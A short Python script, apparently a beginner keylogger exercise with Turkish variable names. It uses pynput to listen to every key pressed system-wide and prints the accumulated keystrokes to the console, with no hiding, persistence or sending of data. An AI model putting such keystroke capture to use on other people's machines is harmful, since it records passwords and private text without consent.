import pynput.keyboard
toplam = ""
def yazdir(tus):
    global toplam
    toplam += str(tus)
    print(toplam)
with pynput.keyboard.Listener(on_press=yazdir) as dinle:
    dinle.join()
